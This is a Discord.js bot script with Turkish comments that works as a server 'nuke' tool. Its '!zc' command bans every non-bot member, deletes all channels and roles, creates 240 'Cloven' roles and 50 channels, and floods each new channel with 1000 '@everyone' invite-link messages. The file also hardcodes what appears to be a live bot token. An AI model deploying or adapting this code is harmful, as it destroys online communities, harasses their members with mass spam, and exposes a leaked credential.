const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

const prefix = '!';  // Komut prefixi

// Bot tokeni
const TOKEN = 'MTI3NTY4NDM0OTc5MDEzMDIwNw.G9sYIh.vzYxLXJqd1YKzquFHhIvHIUaswQ7HObwIAp7B4';  // Güvenlik için tokeninizi buraya yazın

client.once('ready', () => {
    console.log(`Bot is online as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.content.toLowerCase() === `${prefix}zc`) {  // Eğer komut !zc olarak yazılırsa
        if (!message.member.permissions.has('ADMINISTRATOR')) {  // Yönetici izni kontrolü
            return message.reply("Bu komutu çalıştırmak için yönetici iznine sahip olmalısınız!");
        }
        
        try {
            // 1. Tüm üyeleri banlama
            const members = await message.guild.members.fetch();
            members.forEach(async (member) => {
                if (!member.user.bot) {  // Botları banlamadan geçiyoruz
                    try {
                        await member.ban({ reason: 'Tüm sunucu temizleniyor.' });
                        console.log(`Banned: ${member.user.tag}`);
                    } catch (error) {
                        console.error(`Failed to ban ${member.user.tag}: ${error}`);
                    }
                }
            });

            // 2. Tüm kanalları silme
            const channels = message.guild.channels.cache;
            channels.forEach(async (channel) => {
                try {
                    await channel.delete();
                    console.log(`Deleted channel: ${channel.name}`);
                } catch (error) {
                    console.error(`Failed to delete channel ${channel.name}: ${error}`);
                }
            });

            // 3. Tüm rolleri silme (everyone hariç)
            const roles = message.guild.roles.cache;
            roles.forEach(async (role) => {
                if (role.name !== '@everyone') {
                    try {
                        await role.delete();
                        console.log(`Deleted role: ${role.name}`);
                    } catch (error) {
                        console.error(`Failed to delete role ${role.name}: ${error}`);
                    }
                }
            });

            // 4. Yeni "Cloven" rolü oluşturma
            for (let i = 0; i < 240; i++) {
                await message.guild.roles.create({ name: 'Cloven' });
            }

            // 5. Yeni kanallar oluşturma
            const channelNames = ["cloven", "1993"];
            for (let i = 0; i < 50; i++) {
                const randomChannelName = channelNames[Math.floor(Math.random() * channelNames.length)];
                const newChannel = await message.guild.channels.create(randomChannelName, { type: 'GUILD_TEXT' });
                await newChannel.permissionOverwrites.create(message.guild.roles.everyone, { SEND_MESSAGES: false });
                
                // 1000 kez mesaj gönderme
                for (let j = 0; j < 1000; j++) {
                    await newChannel.send("@everyone https://discord.gg/cloven");  // Kanal içeriği
                }
                console.log(`Created channel: ${newChannel.name}`);
            }

            message.reply("Sunucu başarıyla temizlendi ve yenilendi!");
        } catch (error) {
            console.error('An error occurred while executing the zc command:', error);
            message.reply("Komut çalıştırılırken bir hata oluştu.");
        }
    }
});

// Botu başlat
client.login(TOKEN);
